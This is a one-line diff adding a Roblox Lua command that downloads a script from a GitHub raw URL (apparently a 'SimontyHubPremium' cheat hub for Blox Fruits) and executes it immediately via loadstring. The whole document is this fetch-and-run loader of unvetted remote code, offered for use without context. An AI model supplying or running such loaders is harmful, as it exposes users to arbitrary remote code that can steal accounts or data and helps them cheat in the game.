@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxFruit3Script/SimontyHubPremium/main/SimontyHubPremium.lua.txt"))()
